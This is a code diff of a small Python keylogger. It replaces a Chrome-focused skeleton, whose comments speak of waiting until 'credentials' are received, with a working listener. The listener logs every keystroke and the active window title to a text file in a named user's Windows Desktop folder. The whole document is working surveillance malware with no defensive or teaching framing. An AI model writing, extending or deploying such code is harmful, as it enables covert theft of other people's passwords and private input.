@@ -1,43 +1,19 @@
-import re
+from pynput.keyboard import Key, Listener
 from win32gui import GetWindowText, GetForegroundWindow
-from threading import Thread
-from pynput import keyboard
-import Logger
+import logging
 
-class Main:
-    def __init__(self):
-        # reg ex stuff
-        self.chrome = re.compile(r'chrome', re.IGNORECASE)
-        self.log_file = 'C:\\Users\\Benjamin Pollak\\Desktop\\log.txt'
-        #self.logger = Logger.Logger(self.log_file)
-        self.logger = Logger.Logger()
-        self.credentials_received = False
+log_file = "C:\\Users\\Benjamin Pollak\\Desktop\\log.txt"
+
+logging.basicConfig(filename=(log_file), level=logging.DEBUG, format=( '%(message)s : '))
+
+def on_press(Key):
+    log_str = str(Key) + " | " + GetWindowText(GetForegroundWindow())
+    print(log_str)
+    logging.info(log_str)
+    '''
+    log_str = key.char + " | " + GetWindowText(GetForegroundWindow())
+    print(log_str)
+    '''
     
-    def run_keylogger(self):
-        curr_app = GetWindowText(GetForegroundWindow())
-        
-        # keylogger loop
-        while(1):
-            while(bool(self.chrome.search(curr_app))): 
-                self.logger.startReading(self.doStuff())
-                self.logger.stopReading()
-                
-                #self.logger.log_keystrokes()
-                
-                # TODO: analysis, when do i break?
-                #self.credentials_received = True
-                #if(self.credentials_received):
-                #    break
-                
-                curr_app = GetWindowText(GetForegroundWindow())
-            
-            if(self.credentials_received):
-                break
-            
-            curr_app = GetWindowText(GetForegroundWindow())
-    def doStuff(self):
-        return
-    
-if __name__ == "__main__":
-    Main = Main()
-    Main.run_keylogger()
+with Listener(on_press=on_press) as listener:
+    listener.join()
